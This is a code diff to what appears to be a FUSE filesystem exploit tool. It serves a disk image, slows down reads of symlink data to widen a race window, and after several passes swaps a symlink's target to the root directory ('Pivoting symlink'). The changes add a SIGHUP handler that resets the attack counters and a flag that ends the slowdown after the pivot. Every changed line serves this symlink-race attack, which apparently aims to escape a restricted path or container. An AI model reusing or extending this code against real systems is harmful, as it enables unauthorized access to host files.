@@ -12,6 +12,7 @@
 #include <errno.h>
 #include <getopt.h>
 #include <stdbool.h>
+#include <signal.h>
 
 #define DEFAULT_SYMLINK_PATTERN "./magic_"
 
@@ -29,12 +30,23 @@ static int logfd = STDERR_FILENO;
 static int diskfd;
 
 // Options.
+static bool enable_slowdown = true;
 static unsigned int timeout_secs = 0; 
 static size_t max_block_size = SIZE_MAX;
 static const char *symlink_pattern = DEFAULT_SYMLINK_PATTERN;
 static size_t pattern_size = sizeof(DEFAULT_SYMLINK_PATTERN) - 1;
 static const char *target = "/";
 static unsigned int nr_pass = 2;
+
+static void sighup_handler(int __attribute__((unused)) code)
+{
+    dprintf(logfd, "Received SIGHUP signal, reseting.\n");
+
+    nr_reads = 0;
+    memset(symlink_hits, 0, sizeof(symlink_hits));
+
+    enable_slowdown = true;
+}
 
 static int getattr_callback(const char *path, struct stat *stbuf)
 {
@@ -98,7 +110,7 @@ static int is_symlink(char *buf, size_t size)
                 if ( symlink_idx == 40 && symlink_hits[symlink_idx-1] >= nr_pass ) {
                     dprintf(logfd, "[*] Pivoting symlink to %s\n", target);
                     strcpy(buf + i, target);
-                    timeout_secs = 0;
+                    enable_slowdown = false;
                 }
 
                 return 1;
@@ -132,7 +144,7 @@ static int read_callback(const char *path, char *buf, size_t size, off_t offset,
     if ( strcmp(path, filepath) == 0 ) {
         ret = pread(diskfd, buf, size, offset);
 
-        if ( is_symlink(buf, size) )
+        if ( enable_slowdown && is_symlink(buf, size) )
             delay(timeout_secs);
 
         if ( ret == -1 )
@@ -241,6 +253,8 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Cannot open disk image %s: %s\n", disk_image, strerror(errno));
         return 1;
     }
+
+    signal(SIGHUP, sighup_handler);
 
     char *fuse_argv[] =
     {
